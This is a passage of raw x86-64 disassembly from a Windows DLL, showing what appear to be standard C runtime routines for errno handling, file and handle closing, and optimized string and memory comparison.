   180008275:	89 18                	mov    %ebx,(%rax)
   180008277:	e8 bc a3 ff ff       	call   0x180002638
   18000827c:	8b c3                	mov    %ebx,%eax
   18000827e:	48 83 c4 20          	add    $0x20,%rsp
   180008282:	5b                   	pop    %rbx
   180008283:	c3                   	ret
   180008284:	49 2b c8             	sub    %r8,%rcx
   180008287:	41 0f b7 00          	movzwl (%r8),%eax
   18000828b:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   180008290:	49 83 c0 02          	add    $0x2,%r8
   180008294:	66 85 c0             	test   %ax,%ax
   180008297:	74 05                	je     0x18000829e
   180008299:	48 ff ca             	dec    %rdx
   18000829c:	75 e9                	jne    0x180008287
   18000829e:	48 85 d2             	test   %rdx,%rdx
   1800082a1:	75 10                	jne    0x1800082b3
   1800082a3:	66 45 89 11          	mov    %r10w,(%r9)
   1800082a7:	e8 f4 a3 ff ff       	call   0x1800026a0
   1800082ac:	bb 22 00 00 00       	mov    $0x22,%ebx
   1800082b1:	eb c2                	jmp    0x180008275
   1800082b3:	33 c0                	xor    %eax,%eax
   1800082b5:	eb c7                	jmp    0x18000827e
   1800082b7:	cc                   	int3
   1800082b8:	48 83 ec 28          	sub    $0x28,%rsp
   1800082bc:	85 c9                	test   %ecx,%ecx
   1800082be:	78 20                	js     0x1800082e0
   1800082c0:	83 f9 02             	cmp    $0x2,%ecx
   1800082c3:	7e 0d                	jle    0x1800082d2
   1800082c5:	83 f9 03             	cmp    $0x3,%ecx
   1800082c8:	75 16                	jne    0x1800082e0
   1800082ca:	8b 05 e4 50 00 00    	mov    0x50e4(%rip),%eax        # 0x18000d3b4
   1800082d0:	eb 21                	jmp    0x1800082f3
   1800082d2:	8b 05 dc 50 00 00    	mov    0x50dc(%rip),%eax        # 0x18000d3b4
   1800082d8:	89 0d d6 50 00 00    	mov    %ecx,0x50d6(%rip)        # 0x18000d3b4
   1800082de:	eb 13                	jmp    0x1800082f3
   1800082e0:	e8 bb a3 ff ff       	call   0x1800026a0
   1800082e5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1800082eb:	e8 48 a3 ff ff       	call   0x180002638
   1800082f0:	83 c8 ff             	or     $0xffffffff,%eax
   1800082f3:	48 83 c4 28          	add    $0x28,%rsp
   1800082f7:	c3                   	ret
   1800082f8:	48 83 ec 48          	sub    $0x48,%rsp
   1800082fc:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   180008302:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   180008307:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   18000830d:	48 8d 0d 04 29 00 00 	lea    0x2904(%rip),%rcx        # 0x18000ac18
   180008314:	45 33 c9             	xor    %r9d,%r9d
   180008317:	ba 00 00 00 40       	mov    $0x40000000,%edx
   18000831c:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   180008321:	ff 15 01 0f 00 00    	call   *0xf01(%rip)        # 0x180009228
   180008327:	48 89 05 52 4f 00 00 	mov    %rax,0x4f52(%rip)        # 0x18000d280
   18000832e:	48 83 c4 48          	add    $0x48,%rsp
   180008332:	c3                   	ret
   180008333:	cc                   	int3
   180008334:	48 83 ec 28          	sub    $0x28,%rsp
   180008338:	48 8b 0d 41 4f 00 00 	mov    0x4f41(%rip),%rcx        # 0x18000d280
   18000833f:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   180008343:	74 0c                	je     0x180008351
   180008345:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   180008349:	74 06                	je     0x180008351
   18000834b:	ff 15 af 0c 00 00    	call   *0xcaf(%rip)        # 0x180009000
   180008351:	48 83 c4 28          	add    $0x28,%rsp
   180008355:	c3                   	ret
   180008356:	cc                   	int3
   180008357:	cc                   	int3
   180008358:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000835d:	57                   	push   %rdi
   18000835e:	48 83 ec 20          	sub    $0x20,%rsp
   180008362:	83 cf ff             	or     $0xffffffff,%edi
   180008365:	48 8b d9             	mov    %rcx,%rbx
   180008368:	48 85 c9             	test   %rcx,%rcx
   18000836b:	75 14                	jne    0x180008381
   18000836d:	e8 2e a3 ff ff       	call   0x1800026a0
   180008372:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180008378:	e8 bb a2 ff ff       	call   0x180002638
   18000837d:	0b c7                	or     %edi,%eax
   18000837f:	eb 46                	jmp    0x1800083c7
   180008381:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   180008385:	74 3a                	je     0x1800083c1
   180008387:	e8 c0 e9 ff ff       	call   0x180006d4c
   18000838c:	48 8b cb             	mov    %rbx,%rcx
   18000838f:	8b f8                	mov    %eax,%edi
   180008391:	e8 fe 02 00 00       	call   0x180008694
   180008396:	48 8b cb             	mov    %rbx,%rcx
   180008399:	e8 c2 c6 ff ff       	call   0x180004a60
   18000839e:	8b c8                	mov    %eax,%ecx
   1800083a0:	e8 2b 02 00 00       	call   0x1800085d0
   1800083a5:	85 c0                	test   %eax,%eax
   1800083a7:	79 05                	jns    0x1800083ae
   1800083a9:	83 cf ff             	or     $0xffffffff,%edi
   1800083ac:	eb 13                	jmp    0x1800083c1
   1800083ae:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1800083b2:	48 85 c9             	test   %rcx,%rcx
   1800083b5:	74 0a                	je     0x1800083c1
   1800083b7:	e8 fc a8 ff ff       	call   0x180002cb8
   1800083bc:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   1800083c1:	83 63 18 00          	andl   $0x0,0x18(%rbx)
   1800083c5:	8b c7                	mov    %edi,%eax
   1800083c7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800083cc:	48 83 c4 20          	add    $0x20,%rsp
   1800083d0:	5f                   	pop    %rdi
   1800083d1:	c3                   	ret
   1800083d2:	cc                   	int3
   1800083d3:	cc                   	int3
   1800083d4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800083d9:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800083de:	57                   	push   %rdi
   1800083df:	48 83 ec 20          	sub    $0x20,%rsp
   1800083e3:	48 8b d9             	mov    %rcx,%rbx
   1800083e6:	83 cf ff             	or     $0xffffffff,%edi
   1800083e9:	33 c0                	xor    %eax,%eax
   1800083eb:	48 85 c9             	test   %rcx,%rcx
   1800083ee:	0f 95 c0             	setne  %al
   1800083f1:	85 c0                	test   %eax,%eax
   1800083f3:	75 14                	jne    0x180008409
   1800083f5:	e8 a6 a2 ff ff       	call   0x1800026a0
   1800083fa:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180008400:	e8 33 a2 ff ff       	call   0x180002638
   180008405:	8b c7                	mov    %edi,%eax
   180008407:	eb 26                	jmp    0x18000842f
   180008409:	f6 41 18 40          	testb  $0x40,0x18(%rcx)
   18000840d:	74 06                	je     0x180008415
   18000840f:	83 61 18 00          	andl   $0x0,0x18(%rcx)
   180008413:	eb f0                	jmp    0x180008405
   180008415:	e8 42 c5 ff ff       	call   0x18000495c
   18000841a:	90                   	nop
   18000841b:	48 8b cb             	mov    %rbx,%rcx
   18000841e:	e8 35 ff ff ff       	call   0x180008358
   180008423:	8b f8                	mov    %eax,%edi
   180008425:	48 8b cb             	mov    %rbx,%rcx
   180008428:	e8 c7 c5 ff ff       	call   0x1800049f4
   18000842d:	eb d6                	jmp    0x180008405
   18000842f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180008434:	48 83 c4 20          	add    $0x20,%rsp
   180008438:	5f                   	pop    %rdi
   180008439:	c3                   	ret
   18000843a:	cc                   	int3
   18000843b:	cc                   	int3
   18000843c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180008441:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180008445:	56                   	push   %rsi
   180008446:	57                   	push   %rdi
   180008447:	41 54                	push   %r12
   180008449:	48 83 ec 20          	sub    $0x20,%rsp
   18000844d:	48 63 f9             	movslq %ecx,%rdi
   180008450:	83 ff fe             	cmp    $0xfffffffe,%edi
   180008453:	75 10                	jne    0x180008465
   180008455:	e8 46 a2 ff ff       	call   0x1800026a0
   18000845a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180008460:	e9 9d 00 00 00       	jmp    0x180008502
   180008465:	85 c9                	test   %ecx,%ecx
   180008467:	0f 88 85 00 00 00    	js     0x1800084f2
   18000846d:	3b 3d 91 6f 00 00    	cmp    0x6f91(%rip),%edi        # 0x18000f404
   180008473:	73 7d                	jae    0x1800084f2
   180008475:	48 8b df             	mov    %rdi,%rbx
   180008478:	48 8b f7             	mov    %rdi,%rsi
   18000847b:	48 c1 fe 05          	sar    $0x5,%rsi
   18000847f:	4c 8d 25 9a 6f 00 00 	lea    0x6f9a(%rip),%r12        # 0x18000f420
   180008486:	83 e3 1f             	and    $0x1f,%ebx
   180008489:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   18000848d:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   180008491:	0f be 4c 18 08       	movsbl 0x8(%rax,%rbx,1),%ecx
   180008496:	83 e1 01             	and    $0x1,%ecx
   180008499:	74 57                	je     0x1800084f2
   18000849b:	8b cf                	mov    %edi,%ecx
   18000849d:	e8 ea e4 ff ff       	call   0x18000698c
   1800084a2:	90                   	nop
   1800084a3:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   1800084a7:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   1800084ac:	74 2b                	je     0x1800084d9
   1800084ae:	8b cf                	mov    %edi,%ecx
   1800084b0:	e8 63 e4 ff ff       	call   0x180006918
   1800084b5:	48 8b c8             	mov    %rax,%rcx
   1800084b8:	ff 15 72 0d 00 00    	call   *0xd72(%rip)        # 0x180009230
   1800084be:	85 c0                	test   %eax,%eax
   1800084c0:	75 0a                	jne    0x1800084cc
   1800084c2:	ff 15 00 0c 00 00    	call   *0xc00(%rip)        # 0x1800090c8
   1800084c8:	8b d8                	mov    %eax,%ebx
   1800084ca:	eb 02                	jmp    0x1800084ce
   1800084cc:	33 db                	xor    %ebx,%ebx
   1800084ce:	85 db                	test   %ebx,%ebx
   1800084d0:	74 15                	je     0x1800084e7
   1800084d2:	e8 e9 a1 ff ff       	call   0x1800026c0
   1800084d7:	89 18                	mov    %ebx,(%rax)
   1800084d9:	e8 c2 a1 ff ff       	call   0x1800026a0
   1800084de:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1800084e4:	83 cb ff             	or     $0xffffffff,%ebx
   1800084e7:	8b cf                	mov    %edi,%ecx
   1800084e9:	e8 46 e5 ff ff       	call   0x180006a34
   1800084ee:	8b c3                	mov    %ebx,%eax
   1800084f0:	eb 13                	jmp    0x180008505
   1800084f2:	e8 a9 a1 ff ff       	call   0x1800026a0
   1800084f7:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1800084fd:	e8 36 a1 ff ff       	call   0x180002638
   180008502:	83 c8 ff             	or     $0xffffffff,%eax
   180008505:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000850a:	48 83 c4 20          	add    $0x20,%rsp
   18000850e:	41 5c                	pop    %r12
   180008510:	5f                   	pop    %rdi
   180008511:	5e                   	pop    %rsi
   180008512:	c3                   	ret
   180008513:	cc                   	int3
   180008514:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008519:	57                   	push   %rdi
   18000851a:	48 83 ec 20          	sub    $0x20,%rsp
   18000851e:	48 63 f9             	movslq %ecx,%rdi
   180008521:	8b cf                	mov    %edi,%ecx
   180008523:	e8 f0 e3 ff ff       	call   0x180006918
   180008528:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000852c:	74 59                	je     0x180008587
   18000852e:	48 8b 05 eb 6e 00 00 	mov    0x6eeb(%rip),%rax        # 0x18000f420
   180008535:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000853a:	83 ff 01             	cmp    $0x1,%edi
   18000853d:	75 09                	jne    0x180008548
   18000853f:	40 84 b8 b8 00 00 00 	test   %dil,0xb8(%rax)
   180008546:	75 0a                	jne    0x180008552
   180008548:	3b f9                	cmp    %ecx,%edi
   18000854a:	75 1d                	jne    0x180008569
   18000854c:	f6 40 60 01          	testb  $0x1,0x60(%rax)
   180008550:	74 17                	je     0x180008569
   180008552:	e8 c1 e3 ff ff       	call   0x180006918
   180008557:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000855c:	48 8b d8             	mov    %rax,%rbx
   18000855f:	e8 b4 e3 ff ff       	call   0x180006918
   180008564:	48 3b c3             	cmp    %rbx,%rax
   180008567:	74 1e                	je     0x180008587
   180008569:	8b cf                	mov    %edi,%ecx
   18000856b:	e8 a8 e3 ff ff       	call   0x180006918
   180008570:	48 8b c8             	mov    %rax,%rcx
   180008573:	ff 15 87 0a 00 00    	call   *0xa87(%rip)        # 0x180009000
   180008579:	85 c0                	test   %eax,%eax
   18000857b:	75 0a                	jne    0x180008587
   18000857d:	ff 15 45 0b 00 00    	call   *0xb45(%rip)        # 0x1800090c8
   180008583:	8b d8                	mov    %eax,%ebx
   180008585:	eb 02                	jmp    0x180008589
   180008587:	33 db                	xor    %ebx,%ebx
   180008589:	8b cf                	mov    %edi,%ecx
   18000858b:	e8 dc e2 ff ff       	call   0x18000686c
   180008590:	4c 8b df             	mov    %rdi,%r11
   180008593:	48 8b cf             	mov    %rdi,%rcx
   180008596:	48 c1 f9 05          	sar    $0x5,%rcx
   18000859a:	41 83 e3 1f          	and    $0x1f,%r11d
   18000859e:	48 8d 15 7b 6e 00 00 	lea    0x6e7b(%rip),%rdx        # 0x18000f420
   1800085a5:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   1800085a9:	4d 6b db 58          	imul   $0x58,%r11,%r11
   1800085ad:	42 c6 44 19 08 00    	movb   $0x0,0x8(%rcx,%r11,1)
   1800085b3:	85 db                	test   %ebx,%ebx
   1800085b5:	74 0c                	je     0x1800085c3
   1800085b7:	8b cb                	mov    %ebx,%ecx
   1800085b9:	e8 22 a1 ff ff       	call   0x1800026e0
   1800085be:	83 c8 ff             	or     $0xffffffff,%eax
   1800085c1:	eb 02                	jmp    0x1800085c5
   1800085c3:	33 c0                	xor    %eax,%eax
   1800085c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800085ca:	48 83 c4 20          	add    $0x20,%rsp
   1800085ce:	5f                   	pop    %rdi
   1800085cf:	c3                   	ret
   1800085d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800085d5:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1800085d9:	56                   	push   %rsi
   1800085da:	57                   	push   %rdi
   1800085db:	41 54                	push   %r12
   1800085dd:	48 83 ec 20          	sub    $0x20,%rsp
   1800085e1:	48 63 d9             	movslq %ecx,%rbx
   1800085e4:	83 fb fe             	cmp    $0xfffffffe,%ebx
   1800085e7:	75 18                	jne    0x180008601
   1800085e9:	e8 d2 a0 ff ff       	call   0x1800026c0
   1800085ee:	83 20 00             	andl   $0x0,(%rax)
   1800085f1:	e8 aa a0 ff ff       	call   0x1800026a0
   1800085f6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1800085fc:	e9 81 00 00 00       	jmp    0x180008682
   180008601:	85 c9                	test   %ecx,%ecx
   180008603:	78 65                	js     0x18000866a
   180008605:	3b 1d f9 6d 00 00    	cmp    0x6df9(%rip),%ebx        # 0x18000f404
   18000860b:	73 5d                	jae    0x18000866a
   18000860d:	48 8b fb             	mov    %rbx,%rdi
   180008610:	48 8b f3             	mov    %rbx,%rsi
   180008613:	48 c1 fe 05          	sar    $0x5,%rsi
   180008617:	4c 8d 25 02 6e 00 00 	lea    0x6e02(%rip),%r12        # 0x18000f420
   18000861e:	83 e7 1f             	and    $0x1f,%edi
   180008621:	48 6b ff 58          	imul   $0x58,%rdi,%rdi
   180008625:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   180008629:	0f be 4c 38 08       	movsbl 0x8(%rax,%rdi,1),%ecx
   18000862e:	83 e1 01             	and    $0x1,%ecx
   180008631:	74 37                	je     0x18000866a
   180008633:	8b cb                	mov    %ebx,%ecx
   180008635:	e8 52 e3 ff ff       	call   0x18000698c
   18000863a:	90                   	nop
   18000863b:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   18000863f:	f6 44 38 08 01       	testb  $0x1,0x8(%rax,%rdi,1)
   180008644:	74 0b                	je     0x180008651
   180008646:	8b cb                	mov    %ebx,%ecx
   180008648:	e8 c7 fe ff ff       	call   0x180008514
   18000864d:	8b f8                	mov    %eax,%edi
   18000864f:	eb 0e                	jmp    0x18000865f
   180008651:	e8 4a a0 ff ff       	call   0x1800026a0
   180008656:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000865c:	83 cf ff             	or     $0xffffffff,%edi
   18000865f:	8b cb                	mov    %ebx,%ecx
   180008661:	e8 ce e3 ff ff       	call   0x180006a34
   180008666:	8b c7                	mov    %edi,%eax
   180008668:	eb 1b                	jmp    0x180008685
   18000866a:	e8 51 a0 ff ff       	call   0x1800026c0
   18000866f:	83 20 00             	andl   $0x0,(%rax)
   180008672:	e8 29 a0 ff ff       	call   0x1800026a0
   180008677:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000867d:	e8 b6 9f ff ff       	call   0x180002638
   180008682:	83 c8 ff             	or     $0xffffffff,%eax
   180008685:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000868a:	48 83 c4 20          	add    $0x20,%rsp
   18000868e:	41 5c                	pop    %r12
   180008690:	5f                   	pop    %rdi
   180008691:	5e                   	pop    %rsi
   180008692:	c3                   	ret
   180008693:	cc                   	int3
   180008694:	40 53                	rex push %rbx
   180008696:	48 83 ec 20          	sub    $0x20,%rsp
   18000869a:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   18000869e:	48 8b d9             	mov    %rcx,%rbx
   1800086a1:	74 22                	je     0x1800086c5
   1800086a3:	f6 41 18 08          	testb  $0x8,0x18(%rcx)
   1800086a7:	74 1c                	je     0x1800086c5
   1800086a9:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1800086ad:	e8 06 a6 ff ff       	call   0x180002cb8
   1800086b2:	81 63 18 f7 fb ff ff 	andl   $0xfffffbf7,0x18(%rbx)
   1800086b9:	33 c0                	xor    %eax,%eax
   1800086bb:	48 89 03             	mov    %rax,(%rbx)
   1800086be:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800086c2:	89 43 08             	mov    %eax,0x8(%rbx)
   1800086c5:	48 83 c4 20          	add    $0x20,%rsp
   1800086c9:	5b                   	pop    %rbx
   1800086ca:	c3                   	ret
   1800086cb:	cc                   	int3
   1800086cc:	cc                   	int3
   1800086cd:	cc                   	int3
   1800086ce:	cc                   	int3
   1800086cf:	cc                   	int3
   1800086d0:	cc                   	int3
   1800086d1:	cc                   	int3
   1800086d2:	cc                   	int3
   1800086d3:	cc                   	int3
   1800086d4:	cc                   	int3
   1800086d5:	cc                   	int3
   1800086d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800086dd:	00 00 00 
   1800086e0:	48 2b d1             	sub    %rcx,%rdx
   1800086e3:	4c 8b ca             	mov    %rdx,%r9
   1800086e6:	f6 c1 07             	test   $0x7,%cl
   1800086e9:	74 1b                	je     0x180008706
   1800086eb:	8a 01                	mov    (%rcx),%al
   1800086ed:	42 8a 14 09          	mov    (%rcx,%r9,1),%dl
   1800086f1:	3a c2                	cmp    %dl,%al
   1800086f3:	75 56                	jne    0x18000874b
   1800086f5:	48 ff c1             	inc    %rcx
   1800086f8:	84 c0                	test   %al,%al
   1800086fa:	74 57                	je     0x180008753
   1800086fc:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   180008703:	75 e6                	jne    0x1800086eb
   180008705:	90                   	nop
   180008706:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   18000870d:	01 01 81 
   180008710:	4a 8d 14 09          	lea    (%rcx,%r9,1),%rdx
   180008714:	66 81 e2 ff 0f       	and    $0xfff,%dx
   180008719:	66 81 fa f8 0f       	cmp    $0xff8,%dx
   18000871e:	77 cb                	ja     0x1800086eb
   180008720:	48 8b 01             	mov    (%rcx),%rax
   180008723:	4a 8b 14 09          	mov    (%rcx,%r9,1),%rdx
   180008727:	48 3b c2             	cmp    %rdx,%rax
   18000872a:	75 bf                	jne    0x1800086eb
   18000872c:	49 ba ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r10
   180008733:	fe fe 7e 
   180008736:	4c 03 d2             	add    %rdx,%r10
   180008739:	48 83 f0 ff          	xor    $0xffffffffffffffff,%rax
   18000873d:	48 83 c1 08          	add    $0x8,%rcx
   180008741:	49 33 c2             	xor    %r10,%rax
   180008744:	49 85 c3             	test   %rax,%r11
   180008747:	74 c7                	je     0x180008710
   180008749:	eb 0f                	jmp    0x18000875a
   18000874b:	48 1b c0             	sbb    %rax,%rax
   18000874e:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   180008752:	c3                   	ret
   180008753:	33 c0                	xor    %eax,%eax
   180008755:	c3                   	ret
   180008756:	66 66 66 90          	data16 data16 xchg %ax,%ax
   18000875a:	84 d2                	test   %dl,%dl
   18000875c:	74 27                	je     0x180008785
   18000875e:	84 f6                	test   %dh,%dh
   180008760:	74 23                	je     0x180008785
   180008762:	48 c1 ea 10          	shr    $0x10,%rdx
   180008766:	84 d2                	test   %dl,%dl
   180008768:	74 1b                	je     0x180008785
   18000876a:	84 f6                	test   %dh,%dh
   18000876c:	74 17                	je     0x180008785
   18000876e:	48 c1 ea 10          	shr    $0x10,%rdx
   180008772:	84 d2                	test   %dl,%dl
   180008774:	74 0f                	je     0x180008785
   180008776:	84 f6                	test   %dh,%dh
   180008778:	74 0b                	je     0x180008785
   18000877a:	c1 ea 10             	shr    $0x10,%edx
   18000877d:	84 d2                	test   %dl,%dl
   18000877f:	74 04                	je     0x180008785
   180008781:	84 f6                	test   %dh,%dh
   180008783:	75 8b                	jne    0x180008710
   180008785:	33 c0                	xor    %eax,%eax
   180008787:	c3                   	ret
   180008788:	48 1b c0             	sbb    %rax,%rax
   18000878b:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   18000878f:	c3                   	ret
   180008790:	cc                   	int3
   180008791:	cc                   	int3
   180008792:	cc                   	int3
   180008793:	cc                   	int3
   180008794:	cc                   	int3
   180008795:	cc                   	int3
   180008796:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000879d:	00 00 00 
   1800087a0:	48 2b d1             	sub    %rcx,%rdx
   1800087a3:	49 83 f8 08          	cmp    $0x8,%r8
   1800087a7:	72 22                	jb     0x1800087cb
   1800087a9:	f6 c1 07             	test   $0x7,%cl
   1800087ac:	74 14                	je     0x1800087c2
   1800087ae:	66 90                	xchg   %ax,%ax
   1800087b0:	8a 01                	mov    (%rcx),%al
   1800087b2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   1800087b5:	75 2c                	jne    0x1800087e3
   1800087b7:	48 ff c1             	inc    %rcx
   1800087ba:	49 ff c8             	dec    %r8
   1800087bd:	f6 c1 07             	test   $0x7,%cl
   1800087c0:	75 ee                	jne    0x1800087b0
   1800087c2:	4d 8b c8             	mov    %r8,%r9
   1800087c5:	49 c1 e9 03          	shr    $0x3,%r9
   1800087c9:	75 1f                	jne    0x1800087ea
   1800087cb:	4d 85 c0             	test   %r8,%r8
   1800087ce:	74 0f                	je     0x1800087df
   1800087d0:	8a 01                	mov    (%rcx),%al
   1800087d2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   1800087d5:	75 0c                	jne    0x1800087e3
   1800087d7:	48 ff c1             	inc    %rcx
   1800087da:	49 ff c8             	dec    %r8
   1800087dd:	75 f1                	jne    0x1800087d0
   1800087df:	48 33 c0             	xor    %rax,%rax
   1800087e2:	c3                   	ret
   1800087e3:	1b c0                	sbb    %eax,%eax
   1800087e5:	83 d8 ff             	sbb    $0xffffffff,%eax
   1800087e8:	c3                   	ret
   1800087e9:	90                   	nop
   1800087ea:	49 c1 e9 02          	shr    $0x2,%r9
   1800087ee:	74 37                	je     0x180008827
   1800087f0:	48 8b 01             	mov    (%rcx),%rax
   1800087f3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   1800087f7:	75 5b                	jne    0x180008854
   1800087f9:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1800087fd:	48 3b 44 0a 08       	cmp    0x8(%rdx,%rcx,1),%rax
   180008802:	75 4c                	jne    0x180008850
   180008804:	48 8b 41 10          	mov    0x10(%rcx),%rax
   180008808:	48 3b 44 0a 10       	cmp    0x10(%rdx,%rcx,1),%rax
   18000880d:	75 3d                	jne    0x18000884c
   18000880f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   180008813:	48 3b 44 0a 18       	cmp    0x18(%rdx,%rcx,1),%rax
   180008818:	75 2e                	jne    0x180008848
   18000881a:	48 83 c1 20          	add    $0x20,%rcx
   18000881e:	49 ff c9             	dec    %r9
   180008821:	75 cd                	jne    0x1800087f0
   180008823:	49 83 e0 1f          	and    $0x1f,%r8
   180008827:	4d 8b c8             	mov    %r8,%r9
   18000882a:	49 c1 e9 03          	shr    $0x3,%r9
   18000882e:	74 9b                	je     0x1800087cb
   180008830:	48 8b 01             	mov    (%rcx),%rax
   180008833:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   180008837:	75 1b                	jne    0x180008854
   180008839:	48 83 c1 08          	add    $0x8,%rcx
   18000883d:	49 ff c9             	dec    %r9
   180008840:	75 ee                	jne    0x180008830
   180008842:	49 83 e0 07          	and    $0x7,%r8
   180008846:	eb 83                	jmp    0x1800087cb
   180008848:	48 83 c1 08          	add    $0x8,%rcx
   18000884c:	48 83 c1 08          	add    $0x8,%rcx
   180008850:	48 83 c1 08          	add    $0x8,%rcx
   180008854:	48 8b 0c 11          	mov    (%rcx,%rdx,1),%rcx
   180008858:	48 0f c8             	bswap  %rax
   18000885b:	48 0f c9             	bswap  %rcx
   18000885e:	48 3b c1             	cmp    %rcx,%rax
   180008861:	1b c0                	sbb    %eax,%eax
   180008863:	83 d8 ff             	sbb    $0xffffffff,%eax
   180008866:	c3                   	ret
   180008867:	cc                   	int3
   180008868:	cc                   	int3
   180008869:	cc                   	int3
   18000886a:	cc                   	int3
   18000886b:	cc                   	int3
   18000886c:	cc                   	int3
   18000886d:	cc                   	int3
   18000886e:	cc                   	int3
   18000886f:	cc                   	int3
   180008870:	cc                   	int3
   180008871:	cc                   	int3
   180008872:	cc                   	int3
   180008873:	cc                   	int3
   180008874:	cc                   	int3
   180008875:	cc                   	int3
   180008876:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000887d:	00 00 00 
   180008880:	4d 85 c0             	test   %r8,%r8
   180008883:	74 75                	je     0x1800088fa
   180008885:	48 2b d1             	sub    %rcx,%rdx
   180008888:	4c 8b ca             	mov    %rdx,%r9
   18000888b:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   180008892:	01 01 81 
   180008895:	f6 c1 07             	test   $0x7,%cl
   180008898:	74 1f                	je     0x1800088b9
   18000889a:	8a 01                	mov    (%rcx),%al
   18000889c:	42 8a 14 09          	mov    (%rcx,%r9,1),%dl
   1800088a0:	48 ff c1             	inc    %rcx
   1800088a3:	3a c2                	cmp    %dl,%al
   1800088a5:	75 57                	jne    0x1800088fe
   1800088a7:	49 ff c8             	dec    %r8
   1800088aa:	74 4e                	je     0x1800088fa
   1800088ac:	84 c0                	test   %al,%al
   1800088ae:	74 4a                	je     0x1800088fa
   1800088b0:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   1800088b7:	75 e1                	jne    0x18000889a
   1800088b9:	4a 8d 14 09          	lea    (%rcx,%r9,1),%rdx
   1800088bd:	66 81 e2 ff 0f       	and    $0xfff,%dx
   1800088c2:	66 81 fa f8 0f       	cmp    $0xff8,%dx
   1800088c7:	77 d1                	ja     0x18000889a
   1800088c9:	48 8b 01             	mov    (%rcx),%rax
   1800088cc:	4a 8b 14 09          	mov    (%rcx,%r9,1),%rdx
   1800088d0:	48 3b c2             	cmp    %rdx,%rax
   1800088d3:	75 c5                	jne    0x18000889a
   1800088d5:	48 83 c1 08          	add    $0x8,%rcx
   1800088d9:	49 83 e8 08          	sub    $0x8,%r8
   1800088dd:	49 ba ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r10
   1800088e4:	fe fe 7e 
   1800088e7:	76 11                	jbe    0x1800088fa
   1800088e9:	48 83 f0 ff          	xor    $0xffffffffffffffff,%rax
   1800088ed:	4c 03 d2             	add    %rdx,%r10
   1800088f0:	49 33 c2             	xor    %r10,%rax
   1800088f3:	49 85 c3             	test   %rax,%r11
   1800088f6:	74 c1                	je     0x1800088b9
   1800088f8:	eb 0c                	jmp    0x180008906
   1800088fa:	48 33 c0             	xor    %rax,%rax
   1800088fd:	c3                   	ret
   1800088fe:	48 1b c0             	sbb    %rax,%rax
   180008901:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   180008905:	c3                   	ret
   180008906:	84 d2                	test   %dl,%dl
   180008908:	74 27                	je     0x180008931
   18000890a:	84 f6                	test   %dh,%dh
   18000890c:	74 23                	je     0x180008931
   18000890e:	48 c1 ea 10          	shr    $0x10,%rdx
   180008912:	84 d2                	test   %dl,%dl
   180008914:	74 1b                	je     0x180008931
   180008916:	84 f6                	test   %dh,%dh
   180008918:	74 17                	je     0x180008931
   18000891a:	48 c1 ea 10          	shr    $0x10,%rdx
   18000891e:	84 d2                	test   %dl,%dl
   180008920:	74 0f                	je     0x180008931
